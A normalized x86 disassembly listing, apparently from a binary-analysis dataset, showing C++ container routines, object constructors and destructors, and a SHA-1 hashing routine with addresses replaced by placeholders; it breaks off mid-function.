call sub_41be6f
mov ecx [ eax ]
push [ ebp + 0x10 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
push [ ebp + 0x8 ]
push ebx
call sub_41be6f
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x3c ]
call sub_425e4c
retn 0x14
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
push ebx
call sub_41be6f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x14 ] 0x1
mov [ eax ] esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xcc ]
push eax
call sub_401152
push [ ebp + 0xc ]
lea eax [ ebp - 0xcc ]
mov [ ebp - 0x4 ] 0x1
push eax
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] 0x1
call sub_419691
mov esi eax
lea esi [ ebp - 0xcc ]
call sub_4011ad
sub_41be6f
push 0x34
mov eax sub_43ac75
call sub_425dad
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea ebx [ ebp - 0x18 ]
call sub_41c19a
mov eax [ edi + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi ]
lea edi [ ebp - 0x20 ]
mov esi ebx
mov [ ebp - 0x20 ] eax
call sub_40f543
mov edi [ ebp - 0x14 ]
test al al
jne r-xdata
push [ ebp + 0xc ]
lea ecx [ ebp - 0x40 ]
call sub_403de3
xor esi esi
mov [ ebp - 0x24 ] esi
push edi
mov [ ebp - 0x4 ] esi
push [ ebp - 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_41c008
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov [ ebp - 0x18 ] ecx
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x14 ] eax
call sub_40415f
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0xc ]
call sub_405664
test al al
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_40f2d4
add eax 0x1c
call sub_425e4c
retn 0x8
sub_41bf2c
push esi
lea esi [ edi + 0x18 ]
mov eax [ esi ]
push [ eax + 0x4 ]
mov ecx edi
call sub_41c1da
mov eax [ esi ]
mov [ eax + 0x4 ] eax
mov eax [ esi ]
and [ edi + 0x1c ] 0x0
mov [ eax ] eax
mov esi [ esi ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_41bf50
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
lea ebx [ ebp - 0xc ]
call sub_41c19a
mov eax [ edi + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
lea edi [ ebp - 0x14 ]
mov esi ebx
mov [ ebp - 0x14 ] eax
call sub_40f543
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
mov ecx ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0xc
sub_41bfbb
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x2d ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2d ] bl
jne r-xdata
call sub_423d5c
jmp r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2d ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ecx ]
cmp [ eax + 0x2d ] bl
je r-xdata
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_41c008
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x1c ] eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
add ecx 0xc
mov eax edi
call sub_405664
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
add eax 0xc
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
push ebx
lea ebx [ ebp - 0x14 ]
call sub_419dea
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov ecx [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_40f86a
mov eax [ eax + 0x4 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
push 0x0
jmp r-xdata
push [ ebp + 0xc ]
push 0x1
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_41bfbb
lea edi [ ebp - 0x10 ]
mov esi eax
call sub_40f543
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2d ] 0x0
push edi
mov esi ebx
je r-xdata
mov esi ebx
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2d ] 0x0
push [ ebp + 0xc ]
mov esi ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
jmp r-xdata
push 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push 0x1
jmp r-xdata
push [ ebp + 0x8 ]
call sub_419eae
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41c19a
push ebp
mov ebp esp
push ecx
mov eax [ edi + 0x18 ]
push esi
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ edi ]
mov [ ebx ] eax
mov eax ebx
pop esi
leave
retn 0x4
mov [ ebp - 0x4 ] esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
sub_41c1da
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi + 0x2d ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_41c1da
mov esi [ esi ]
push 0x0
push 0x1
lea ecx [ edi + 0xc ]
call sub_40415f
push edi
call sub_42412e
cmp [ esi + 0x2d ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_41c218
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x2d ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_41c258
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_41c28c
push [ esi + 0x18 ]
call sub_42412e
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
mov esp ebp
pop ebp
retn
sub_41c28c
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
push edi
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_40f543
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_41bfbb
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
push ebx
call sub_40fc47
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov edi ebx
call sub_41bf2c
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_41c398
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi ecx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
cmp [ edi + 0x65 ] bl
je r-xdata
cmp [ edi + 0x64 ] bl
jne r-xdata
push r--data
call sub_403dc1
jmp r-xdata
lea esi [ ebp - 0x30 ]
mov eax edi
call sub_41c646
mov [ edi + 0x64 ] 0x1
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
push 0x3
pop ecx
mov eax ebx
and eax ecx
sub ecx eax
mov eax ebx
sar eax 0x2
mov eax [ edi + eax * 4 + 0x4 ]
shl ecx 0x3
shr eax cl
movzx eax al
push eax
push r--data
push esi
call sub_42354a
add esp 0xc
inc ebx
inc esi
inc esi
cmp ebx 0x14
jl r-xdata
mov esi [ ebp - 0x34 ]
push 0x28
lea eax [ ebp - 0x30 ]
push eax
call sub_409c3d
sub_41c427
cmp [ ecx + 0x18 ] 0x10
mov edx [ ecx + 0x14 ]
push esi
push edi
jb r-xdata
lea esi [ ecx + 0x4 ]
mov esi [ ecx + 0x4 ]
jmp r-xdata
pop edi
pop esi
retn
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov edi edx
test edx edx
je r-xdata
mov [ eax + 0x65 ] 0x1
cmp [ eax + 0x65 ] 0x0
jne r-xdata
dec edi
cmp [ eax + 0x65 ] 0x0
jne r-xdata
mov ecx [ eax + 0x60 ]
mov dl [ esi ]
mov [ eax + ecx + 0x20 ] dl
inc [ eax + 0x60 ]
add [ eax + 0x18 ] 0x8
mov ecx [ eax + 0x60 ]
jne r-xdata
cmp ecx 0x40
jne r-xdata
inc [ eax + 0x1c ]
jne r-xdata
inc esi
test edi edi
jne r-xdata
call sub_41c489
mov [ eax + 0x65 ] 0x1
jmp r-xdata
sub_41c489
push ebp
mov ebp esp
sub esp 0x150
push ebx
push esi
xor edx edx
lea ecx [ eax + 0x21 ]
push edi
movzx esi [ ecx - 0x1 ]
movzx edi [ ecx ]
shl esi 0x8
or esi edi
movzx edi [ ecx + 0x1 ]
shl esi 0x8
or esi edi
movzx edi [ ecx + 0x2 ]
shl esi 0x8
or esi edi
mov [ ebp + edx * 4 - 0x150 ] esi
inc edx
add ecx 0x4
cmp edx 0x10
jl r-xdata
push 0x40
lea ecx [ ebp - 0x148 ]
pop edx
mov esi [ ecx + 0x2c ]
xor esi [ ecx + 0x18 ]
xor esi [ ecx - 0x8 ]
xor esi [ ecx ]
add ecx 0x4
dec edx
rol esi 0x1
mov [ ecx + 0x34 ] esi
jne r-xdata
mov esi [ eax + 0x10 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] esi
mov esi [ eax + 0x14 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0xc ]
mov edi ecx
not edi
and edi [ ebp - 0x8 ]
mov ebx edx
and ebx ecx
or edi ebx
rol esi 0x5
add esi edi
mov edi [ ebp - 0x4 ]
add esi [ ebp + edi * 4 - 0x150 ]
mov edi [ ebp - 0x10 ]
inc [ ebp - 0x4 ]
lea esi [ esi + edi + 0x5a827999 ]
mov edi [ ebp - 0x8 ]
ror ecx 0x2
cmp [ ebp - 0x4 ] 0x14
mov [ ebp - 0x8 ] edx
mov edx ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] esi
jl r-xdata
mov [ ebp - 0x4 ] 0x14
mov ebx [ ebp - 0x8 ]
xor ebx edx
xor ebx ecx
rol esi 0x5
add esi ebx
mov ebx [ ebp - 0x4 ]
add esi [ ebp + ebx * 4 - 0x150 ]
inc [ ebp - 0x4 ]
lea esi [ esi + edi + 0x6ed9eba1 ]
mov edi [ ebp - 0x8 ]
ror ecx 0x2
cmp [ ebp - 0x4 ] 0x28
mov [ ebp - 0x8 ] edx
mov edx ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
jl r-xdata
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x28
mov edi edx
or edi ecx
and edi [ ebp - 0x8 ]
mov ebx edx
and ebx ecx
or edi ebx
mov ebx [ ebp - 0x4 ]
add edi [ ebp + ebx * 4 - 0x150 ]
rol esi 0x5
add esi [ ebp - 0x10 ]
inc [ ebp - 0x4 ]
lea esi [ edi + esi - 0x70e44324 ]
mov edi [ ebp - 0x8 ]
ror ecx 0x2
push 0x3c
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] edx
pop edi
cmp [ ebp - 0x4 ] edi
mov edx ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
jl r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
xor edi edx
xor edi ecx
add edi [ ebp + ebx * 4 - 0x150 ]
mov ebx [ ebp - 0x8 ]
rol esi 0x5
add esi [ ebp - 0x10 ]
inc [ ebp - 0x4 ]
ror ecx 0x2
cmp [ ebp - 0x4 ] 0x50
mov [ ebp - 0x8 ] edx
lea esi [ edi + esi - 0x359d3e2a ]
mov edx ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] esi
jl r-xdata
mov edi [ eax + 0x4 ]
add edi esi
mov esi [ eax + 0x8 ]
add esi ecx
mov ecx [ eax + 0xc ]
add ecx edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x10 ]
add ecx edx
mov [ eax + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov [ eax + 0x4 ] edi
pop edi
add ecx ebx
and [ eax + 0x60 ] 0x0
mov [ eax + 0x8 ] esi
pop esi
mov [ eax + 0x14 ] ecx
pop ebx
leave
retn
sub_41c646
mov ecx [ eax + 0x60 ]
mov [ ecx + eax + 0x20 ] 0x80
inc [ eax + 0x60 ]
cmp ecx 0x37
mov ecx [ eax + 0x60 ]
jle r-xdata
cmp ecx 0x38
jl r-xdata
jmp r-xdata
mov [ ecx + eax + 0x20 ] 0x0
inc [ eax + 0x60 ]
mov ecx [ eax + 0x60 ]
mov cl [ eax + 0x1f ]
mov [ eax + 0x58 ] cl
mov cl [ eax + 0x1e ]
mov [ eax + 0x59 ] cl
mov cl [ eax + 0x1d ]
mov [ eax + 0x5a ] cl
mov cl [ eax + 0x1c ]
mov [ eax + 0x5b ] cl
mov cl [ eax + 0x1b ]
mov [ eax + 0x5c ] cl
mov cl [ eax + 0x1a ]
mov [ eax + 0x5d ] cl
mov cl [ eax + 0x19 ]
mov [ eax + 0x5e ] cl
mov cl [ eax + 0x18 ]
mov [ eax + 0x5f ] cl
jmp sub_41c489
cmp ecx 0x40
jl r-xdata
mov [ ecx + eax + 0x20 ] 0x0
inc [ eax + 0x60 ]
mov ecx [ eax + 0x60 ]
call sub_41c489
jmp r-xdata
cmp [ eax + 0x60 ] 0x38
jl r-xdata
mov ecx [ eax + 0x60 ]
mov [ eax + ecx + 0x20 ] 0x0
inc [ eax + 0x60 ]
jmp r-xdata
sub_41c6d9
push 0x20
mov eax sub_43ac52
call sub_425dad
mov esi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ esi + 0x7c ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ ebp - 0x2c ]
push eax
call sub_41f313
add esp 0x20
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
call sub_425e4c
retn 0x4
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push 0xffffffff
push ebx
push eax
lea ecx [ esi + 0x3c ]
call sub_40400a
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_41c741
push 0x20
mov eax sub_43ac52
call sub_425dad
mov esi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ esi + 0x7c ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ ebp - 0x2c ]
push eax
call sub_41f313
add esp 0x20
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
call sub_425e4c
retn 0x4
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push 0xffffffff
push ebx
add esi 0x3c
call sub_404233
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_41c820
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
add ecx 0x110
call sub_41e897
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn 0x8
sub_41c842
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
add ecx 0xd0
call sub_41e897
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn 0x8
sub_41c864
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
add ecx 0xf0
call sub_41e897
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn 0x8
sub_41c886
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
add ecx 0xb0
call sub_41e897
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn 0x8
sub_41c8b6
push 0x0
mov eax sub_43cb7d
call sub_425dad
mov ebx [ ebp + 0x8 ]
xor esi esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_41ec78
lea eax [ ebx + 0x80 ]
mov [ ebp - 0x4 ] esi
push eax
mov [ ebx ] r--data
call sub_40f0f4
mov [ ebp - 0x4 ] 0x1
lea eax [ ebx + 0xb0 ]
push eax
mov [ ebx + 0x9c ] esi
mov [ ebx + 0xa0 ] esi
mov [ ebx + 0xa4 ] esi
mov [ ebx + 0xa8 ] esi
mov [ ebx + 0xac ] esi
call sub_404a6d
lea eax [ ebx + 0xd0 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404a6d
lea eax [ ebx + 0xf0 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_404a6d
lea eax [ ebx + 0x110 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_404a6d
lea edi [ ebx + 0x130 ]
call sub_404957
lea edi [ ebx + 0x1d8 ]
call sub_404957
lea esi [ ebx + 0x280 ]
call sub_403dae
lea esi [ ebx + 0x29c ]
call sub_403dae
lea esi [ ebx + 0x2b8 ]
call sub_403dae
push [ ebp + 0x14 ]
lea ecx [ ebx + 0x2d4 ]
mov [ ebp - 0x4 ] 0xa
call sub_403de3
mov [ ebx + 0x2f0 ] 0xfffffed4
mov eax ebx
call sub_425e4c
retn 0x10
sub_41c9c0
push 0xc
mov eax sub_43e45a
call sub_425dad
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov eax [ esi ]
xor edi edi
push edi
mov ecx esi
call [ eax + 0x2c ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
push eax
push ebx
call sub_41ec78
lea eax [ ebx + 0x80 ]
mov [ ebp - 0x4 ] edi
push eax
mov [ ebx ] r--data
call sub_40f0f4
mov [ ebp - 0x4 ] 0x1
lea eax [ ebx + 0xb0 ]
push eax
mov [ ebx + 0xa0 ] edi
mov [ ebx + 0xa4 ] edi
mov [ ebx + 0xa8 ] edi
mov [ ebx + 0xac ] edi
call sub_404a6d
lea eax [ ebx + 0xd0 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404a6d
lea eax [ ebx + 0xf0 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_404a6d
lea eax [ ebx + 0x110 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_404a6d
lea edi [ ebx + 0x130 ]
call sub_404957
lea edi [ ebx + 0x1d8 ]
call sub_404957
lea esi [ ebx + 0x280 ]
call sub_403dae
lea esi [ ebx + 0x29c ]
call sub_403dae
lea esi [ ebx + 0x2b8 ]
call sub_403dae
push r--data
lea ecx [ ebx + 0x2d4 ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xb
mov eax [ esi ]
mov ecx esi
call [ eax + 0x30 ]
lea ecx [ ebx + 0x4 ]
call sub_41e91d
mov eax [ esi ]
mov ecx esi
call [ eax + 0x38 ]
mov edi eax
mov eax [ edi + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
call sub_41cc2a
mov eax ebx
call sub_425e4c
retn 0x8
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x64 ]
push eax
mov ecx ebx
call sub_41f873
call sub_408d54
jmp r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
cmp [ ebp - 0x18 ] 0x0
mov esi [ edi + 0x14 ]
mov eax [ edi ]
je r-xdata
sub_41cb16
push 0xc
mov eax sub_43cacb
call sub_425dad
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0xb
lea ebx [ edi + 0x80 ]
mov eax [ ebx + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
mov [ ebp - 0x18 ] eax
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ edi + 0x2d4 ]
call sub_40415f
push 0x0
push esi
lea ecx [ edi + 0x2b8 ]
call sub_40415f
push 0x0
push esi
lea ecx [ edi + 0x29c ]
call sub_40415f
push 0x0
push esi
lea ecx [ edi + 0x280 ]
call sub_40415f
lea esi [ edi + 0x1d8 ]
call sub_4011ad
lea esi [ edi + 0x130 ]
call sub_4011ad
lea eax [ edi + 0x110 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_404bcd
lea eax [ edi + 0xf0 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_404bcd
lea eax [ edi + 0xd0 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404bcd
lea eax [ edi + 0xb0 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_404bcd
mov eax ebx
call sub_416fc8
or [ ebp - 0x4 ] 0xffffffff
mov ecx edi
call sub_41eefe
call sub_425e4c
retn
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_408d54
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ ebp - 0x18 ] 0x0
mov esi [ ebx + 0x14 ]
mov eax [ ebx ]
je r-xdata
sub_41cc2a
push 0xd4
mov eax sub_43e397
call sub_425dad
xor esi esi
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x1c ] esi
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x40 ]
push eax
lea edi [ ebx + 0x130 ]
mov [ ebp - 0x4 ] 0x1
call sub_4145f0
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x40 ]
push eax
lea edi [ ebx + 0x1d8 ]
mov [ ebp - 0x4 ] 0x3
call sub_4145f0
xor edi edi
push esi
inc edi
push edi
lea ecx [ ebp - 0xc4 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push edi
lea ecx [ ebp - 0x78 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x4
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x40 ]
push 0xffffffff
push esi
push eax
lea ecx [ ebx + 0x29c ]
mov [ ebp - 0x4 ] 0x5
call sub_40400a
push esi
push edi
lea ecx [ ebp - 0xc4 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push edi
lea ecx [ ebp - 0x78 ]
call sub_40415f
lea eax [ ebx + 0x20 ]
push r--data
call sub_40563c
pop ecx
mov edi r--data
test al al
je r-xdata
push r--data
lea eax [ ebx + 0x20 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
mov [ ebx + 0x78 ] 0x1
call sub_403dc1
push edi
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push r--data
lea eax [ ebx + 0x20 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
mov [ ebx + 0x78 ] 0x2
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x13
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x14
